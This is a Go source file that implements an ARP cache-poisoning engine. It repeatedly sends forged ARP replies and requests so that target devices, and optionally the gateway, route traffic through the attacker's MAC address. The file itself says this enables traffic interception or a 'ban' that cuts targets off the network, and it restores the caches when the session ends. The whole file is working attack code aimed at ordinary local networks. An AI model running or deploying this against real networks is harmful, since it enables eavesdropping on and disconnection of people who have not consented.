package engine

import (
	"context"
	"log"
	"net"
	"sync"
	"sync/atomic"
	"time"
)

// SpoofConfig describes a poisoning session. Ban poisons without forwarding, which cuts the
// targets off entirely; otherwise the caller is expected to forward intercepted traffic.
type SpoofConfig struct {
	Targets    []Device
	GatewayIP  net.IP
	GatewayMAC net.HardwareAddr
	SelfMAC    net.HardwareAddr
	FullDuplex bool
	Interval   time.Duration
}

const defaultSpoofInterval = time.Second

// Spoofer maintains ARP poisoning for a set of targets and restores their caches on stop.
type Spoofer struct {
	handle Handle

	mu       sync.Mutex
	cfg      SpoofConfig
	sendErrs atomic.Uint64
}

func (s *Spoofer) send(frame []byte) {
	if err := s.handle.Send(frame); err != nil {
		if s.sendErrs.Add(1) == 1 {
			log.Printf("spoof: ARP injection failed (will suppress further): %v", err)
		}
	}
}

func NewSpoofer(h Handle) *Spoofer {
	return &Spoofer{handle: h}
}

// Update swaps the running session's configuration. The poison loop reads the config each tick,
// so changing the target set takes effect on the next interval without restarting the loop.
func (s *Spoofer) Update(cfg SpoofConfig) {
	if cfg.Interval <= 0 {
		cfg.Interval = defaultSpoofInterval
	}
	s.mu.Lock()
	s.cfg = cfg
	s.mu.Unlock()
}

// RestoreDevice re-asserts the real gateway mapping to a single device, used when a device stops
// being managed so its connectivity recovers immediately instead of waiting for its cache to age.
func (s *Spoofer) RestoreDevice(t Device) {
	s.mu.Lock()
	cfg := s.cfg
	s.mu.Unlock()
	for i := 0; i < 4; i++ {
		if frame, err := BuildARPReply(cfg.GatewayIP, cfg.GatewayMAC, t.IP, t.MAC); err == nil {
			_ = s.handle.Send(frame)
		}
		time.Sleep(50 * time.Millisecond)
	}
}

// Start poisons the targets on a ticker until ctx is cancelled, then restores their caches.
// ARP caches heal over time and from legitimate traffic, so the replies must be resent.
func (s *Spoofer) Start(ctx context.Context, cfg SpoofConfig) error {
	if cfg.Interval <= 0 {
		cfg.Interval = defaultSpoofInterval
	}
	s.mu.Lock()
	s.cfg = cfg
	s.mu.Unlock()

	ticker := time.NewTicker(cfg.Interval)
	defer ticker.Stop()

	s.poisonOnce()
	for {
		select {
		case <-ctx.Done():
			return s.Restore()
		case <-ticker.C:
			s.poisonOnce()
		}
	}
}

func (s *Spoofer) poisonOnce() {
	s.mu.Lock()
	cfg := s.cfg
	s.mu.Unlock()

	for _, t := range cfg.Targets {
		// Tell the target the gateway lives at our MAC, as both a reply and a request: some
		// stacks ignore unsolicited replies but still cache the sender of a request.
		if frame, err := BuildARPReply(cfg.GatewayIP, cfg.SelfMAC, t.IP, t.MAC); err == nil {
			s.send(frame)
		}
		if frame, err := BuildPoisonRequest(cfg.GatewayIP, cfg.SelfMAC, t.IP, t.MAC); err == nil {
			s.send(frame)
		}
		// Full duplex also tells the gateway the target lives at our MAC.
		if cfg.FullDuplex {
			if frame, err := BuildARPReply(t.IP, cfg.SelfMAC, cfg.GatewayIP, cfg.GatewayMAC); err == nil {
				s.send(frame)
			}
			if frame, err := BuildPoisonRequest(t.IP, cfg.SelfMAC, cfg.GatewayIP, cfg.GatewayMAC); err == nil {
				s.send(frame)
			}
		}
	}
}

// Restore re-asserts the real MAC mappings to every target and the gateway. It sends each
// correction several times because a single frame may be lost and leaving a victim offline is
// unacceptable.
func (s *Spoofer) Restore() error {
	s.mu.Lock()
	cfg := s.cfg
	s.mu.Unlock()

	const repeats = 4
	for i := 0; i < repeats; i++ {
		for _, t := range cfg.Targets {
			if frame, err := BuildARPReply(cfg.GatewayIP, cfg.GatewayMAC, t.IP, t.MAC); err == nil {
				_ = s.handle.Send(frame)
			}
			if cfg.FullDuplex {
				if frame, err := BuildARPReply(t.IP, t.MAC, cfg.GatewayIP, cfg.GatewayMAC); err == nil {
					_ = s.handle.Send(frame)
				}
			}
		}
		time.Sleep(50 * time.Millisecond)
	}
	return nil
}
